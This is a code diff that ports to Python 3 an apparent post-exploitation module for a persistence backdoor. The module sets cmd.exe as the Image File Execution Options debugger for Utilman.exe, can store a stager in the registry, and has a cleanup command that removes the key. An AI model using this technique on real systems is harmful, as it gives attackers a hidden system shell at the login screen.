@@ -1,7 +1,9 @@
 from __future__ import print_function
+from builtins import object
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -51,7 +53,7 @@ class Module:
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
                 'Required'      :   False,
-                'Value'         :   'HKLM:Software\Microsoft\Network\debug'
+                'Value'         :   r'HKLM:Software\Microsoft\Network\debug'
             },
             'Cleanup' : {
                 'Description'   :   'Switch. Disable the Utilman.exe debugger.',
@@ -61,7 +63,7 @@ class Module:
             'TriggerBinary' : {
                 'Description'   :   'Binary to set for the debugger.',
                 'Required'      :   False,
-                'Value'         :   'C:\Windows\System32\cmd.exe'
+                'Value'         :   r'C:\Windows\System32\cmd.exe'
             }
         }
 
@@ -74,7 +76,6 @@ class Module:
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
-
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
@@ -90,7 +91,6 @@ class Module:
         statusMsg = ""
         locationString = ""
 
-
         if cleanup.lower() == 'true':
             # the registry command to disable the debugger for Utilman.exe
             script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(targetBinary, targetBinary)
@@ -98,7 +98,6 @@ class Module:
                 script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
             return script
         
-
         if listenerName != '':
             # if there's a listener specified, generate a stager and store it
 
